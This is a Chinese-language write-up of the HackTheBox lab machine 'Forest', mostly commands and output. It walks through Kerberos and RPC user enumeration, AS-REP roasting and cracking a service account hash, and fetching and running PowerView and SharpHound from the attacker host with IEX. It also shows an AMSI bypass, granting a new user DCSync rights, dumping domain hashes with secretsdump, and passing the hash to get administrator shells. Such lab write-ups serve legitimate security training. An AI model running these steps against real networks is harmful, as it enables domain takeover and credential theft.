kali 10.10.16.5

靶机  10.10.10.161

[HackTheBox — Forest Writeup (OSCP-Active Directory) | by ZeusCybersec | Medium](https://sparshjazz.medium.com/hackthebox-forest-writeup-active-directory-51e009f347c5)

[HTB: Forest | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/03/21/htb-forest.html#box-info)



```bash
└─# nmap -p- --min-rate 1000 10.10.10.161
└─# nmap -sU -p- --min-rate 1000  10.10.10.161 
└─# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -O -oN nmap.txt 10.10.10.161
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-13 02:45:58Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (94%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2016 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 (92%), Microsoft Windows 10 1507 (92%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2012 (92%), Microsoft Windows Server 2012 R2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-13T02:46:39
|_  start_date: 2023-09-12T22:45:40
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-09-12T19:46:40-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

一眼域控，发现域名 `htb.local`



# 53 dns

枚举域名

```bash
└─# dig  @10.10.10.161 htb.local 
└─# dig  @10.10.10.161 forest.htb.local 
```

```bash
└─# nslookup htb.local 10.10.10.161
└─# nslookup forest.htb.local 10.10.10.161
```

绑定 hosts

```bash
echo "10.10.10.161 htb.local forest.htb.local" >> /etc/hosts
```



# 445 smb

```
smbmap -H 10.10.10.161
smbmap -H 10.10.10.161 -u zf1yolo -p zf1yolo
```

```bash
└─# smbclient -N -L //10.10.10.161
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

啥也没有



# 88

kerberos

因为域身份验证的机制，存在的用户与不存在的用户请求 88 端口 返回的信息是不一样的，所以存在用户名枚举。存在的用户去请求 票据的时候会进行身份验证，在这个过程中可以用不同的密钥去一直请求，所以也存在口令爆破。

用工具 [kerbrute](https://github.com/TarlogicSecurity/kerbrute)

```bash
└─# pip3 install kerbrute -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
```

```bash
└─# kerbrute -users /usr/share/seclists/Usernames/top-usernames-shortlist.txt -domain htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Blocked/Disabled user => guest
[*] Valid user => administrator
[*] No passwords were discovered :'(
```

发现 administrator 用户存在

在以上枚举过程中抓包

<img src=".\图片\Snipaste_2023-09-13_12-21-54.png" alt="Snipaste_2023-09-13_12-21-54" style="zoom:80%;" />

然而，也可能**存在不需要进行域身份验证的用户**，知道了这个用户的用户名，便可以不需要域验证，便可使用其用户的权限

接下来重点可以找不需要进行域身份验证的用户



# ldap

目录访问协议，树形结构的数据库

利用查询 [How To Search LDAP using ldapsearch (With Examples) – devconnected](https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/#Finding_all_objects_in_the_directory_tree)

```bash
└─# ldapsearch -x -b "DC=htb,DC=local" -s sub -H ldap://10.10.10.161 | grep svc-alfresco                                                                      1 ⨯
# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
```

`svc-alfresco` 用户即是不需要域身份验证的用户

<img src=".\图片\Snipaste_2023-09-13_13-09-34.png" alt="Snipaste_2023-09-13_13-09-34" style="zoom:80%;" />

验证：

```bash
└─# kerbrute -user svc-alfresco  -domain htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Valid user => svc-alfresco [NOT PREAUTH]
[*] No passwords were discovered :'(
```



# 445 rpc

rpc 一样可以枚举用户枚举组得到信息，详情见

```http
https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
```

枚举用户

```bash
└─# rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

可尝试把这些用户收集整理成字典，接下来枚举组

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

```bash
rpcclient $> querygroup 0x200
	Group Name:	Domain Admins
	Description:	Designated administrators of the domain
	Group Attribute:7
	Num Members:1
```



# AS-REP Roasting

GetNPUsers.py 是专门为不需要域身份验证用户申请票据的

以下是 rpc 收集到的用户

```bash
└─# cat users.list                                               
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

写一个循环 申请票据

```bash
└─# export PATH=/usr/share/doc/python3-impacket/examples:$PATH            
```

```bash
└─# for user in $(cat users.list); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:cf48d6fe3a3bee0c6f1d4f56b317f02d$185fa69dc7e4f10c4ce99a6e1e1bbccf5e0c1b7bbab89fec64211456286c3a78f8ded942088b2661b0592ff68286b26cf7f8b8572ee4f57a200ef5bed0fc5eccfcb63ac1a54e2b667ab46702a9229759d935f6323e1983c503c2417c7edb6a1fc5e027aff253407b11347d0d7bd03765db1afc1ece4228ec459e86f4a095fe91b3856f02e839c32276eca9d41da4c07b274549c795eecf38c6f827b2d204359dad0e9b829385501eb8f1b4202f5a2c20b59bba199dc8df7a6dce227f193e95e259d72eaeb9dbd9add92715724a833f3552cd999aa048c4d431d07c30c6493352
```

于是爆破以上 hash

```bash
hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
```

得到密码

```
s3rvice
```



# winrm 远程登录

```bash
└─# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice                                                                                                   252 ⨯
                                        
Evil-WinRM shell v3.5 
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ../desktop/user.txt
ad8a13c71444093f3ebde84258f19b43
```

此外还可以 用 `svc-alfresco:s3rvice` 登录 smb 看看



# 提取与横向

## bloodhound

run [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) to collect data for [BloodHound](https://github.com/BloodHoundAD/BloodHound)

开启 80 http服务

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.16.5/SharpHound.ps1")

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

但是我失败了没生成 zip

尝试

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> upload SharpHound.exe
```

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> ./SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> ls


    Directory: C:\Users\svc-alfresco\appdata\local\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/12/2023  11:14 PM          18601 20230912231407_BloodHound.zip
-a----        9/12/2023  11:14 PM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        9/12/2023  11:12 PM        1046528 SharpHound.exe
```

在 kali 里开启 smb 来 从 靶机 传输 zip 到 kali

```bash
└─# /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username zf1yolo -password zf1yolo
```

靶机传输 copy

```
net use \\10.10.16.5\share /u:zf1yolo zf1yolo
copy 20230912231407_BloodHound.zip \\10.10.16.5\share\
del 20230912231407_BloodHound.zip
net use /d \\10.10.16.5\share
```



载入分析：

<img src=".\图片\Snipaste_2023-09-13_14-17-58.png" alt="Snipaste_2023-09-13_14-17-58" style="zoom:80%;" />



步骤一：

通过 `ACCOUNT OPERATORS` 组 添加用户 到 `EXCH01.HTB.LOCAL` 组里

<img src=".\图片\Snipaste_2023-09-13_15-18-38.png" alt="Snipaste_2023-09-13_15-18-38" style="zoom:80%;" />

步骤二：

Exchange 组里通 writeDac 到域控 ， DCSync，可以参考 [记一次靶场域场景之域渗透-NTLM中继攻击思路 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/306668.html)

<img src=".\图片\Snipaste_2023-09-13_15-20-46.png" alt="Snipaste_2023-09-13_15-20-46" style="zoom:80%;" />



## 操作步骤

### 步骤一：

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user zf1yolo zf1yolo /add /domain
```

查看组信息

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup

Aliases for \\FOREST

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*System Managed Accounts Group
*Terminal Server License Servers
*Users
*Windows Authorization Access Group

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group

Group Accounts for \\

-------------------------------------------------------------------------------
*$D31000-NSEL5BRJ63V7
*Cloneable Domain Controllers
*Compliance Management
*Delegated Setup
*Discovery Management
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions
*ExchangeLegacyInterop
*Group Policy Creator Owners
*Help Desk
*Hygiene Management
*Key Admins
*Managed Availability Servers
*Organization Management
*Privileged IT Accounts
*Protected Users
*Public Folder Management
*Read-only Domain Controllers
*Recipient Management
*Records Management
*Schema Admins
*Security Administrator
*Security Reader
*Server Management
*Service Accounts
*test
*UM Management
*View-Only Organization Management
```

把 生成 的 zf1yolo 用户加入 exchange 和 win 远程管理的组

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" zf1yolo /add /domain

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Trusted Subsystem" zf1yolo /add /domain

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup "Remote Management Users" zf1yolo /add 
```

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user zf1yolo
User name                    zf1yolo
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/13/2023 12:29:17 AM
Password expires             Never
Password changeable          9/14/2023 12:29:17 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Exchange Windows Perm*Domain Users
                             *Exchange Trusted Subs
```

再用 winrm 远程登录 `zf1yolo:zf1yolo` 用户

```bash
└─# evil-winrm -i 10.10.10.161 -u zf1yolo -p zf1yolo      

*Evil-WinRM* PS C:\Users\zf1yolo\Documents> whoami
htb\zf1yolo
```

### 步骤二：

writeDac 到域控，根据 bloodhound 里的写法操作

导入 `powerview.ps1`

```powershell
*Evil-WinRM* PS C:\Users\zf1yolo\Documents> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5/PowerView.ps1')"
*Evil-WinRM* PS C:\Users\zf1yolo\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\zf1yolo\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient... 
                                        
[+] Success! 
```



```
$pass = convertto-securestring 'zf1yolo' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\zf1yolo', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zf1yolo -Rights DCSync
```

不会就 看 powerview.ps1 的源码方法 照着写

这里报错了，换种方法导入 ps1

```
wget -Uri http://10.10.16.5/PowerView.ps1 -OutFile PowerView.ps1
. .\PowerView.ps1
```



### 步骤三：

secretsdump.py

```
secretsdump.py zf1yolo:zf1yolo@10.10.10.161
```

得到 administrator 的 hash

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```



横向移动

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
```



```bash
evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```



```
psexec.py "administrator"@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```



```
c:\Users\Administrator\Desktop> type root.txt                                                                08a7ac973fad9a661280c035edc607de
```


